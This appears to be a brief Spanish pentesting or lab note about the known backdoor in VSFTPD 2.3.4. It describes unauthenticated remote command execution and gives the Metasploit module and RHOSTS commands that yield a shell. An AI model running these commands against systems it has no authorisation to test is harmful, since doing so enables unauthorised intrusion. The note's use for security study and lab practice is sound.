Vulnerabilidad en VSFTPD 2.3.4 que permite acceso remoto mediante backdoor.

• Afecta versiones vulnerables de VSFTPD  
• Permite ejecución remota de comandos  
• No requiere credenciales

## Exploit VSFTPD

Explota el backdoor del servicio FTP.

```
use exploit/unix/ftp/vsftpd_234_backdoor
```
	set RHOSTS IP


• Solo funciona en VSFTPD 2.3.4 vulnerable  
• No todas las instalaciones están afectadas  
• Obtener shell directamente si es vulnerable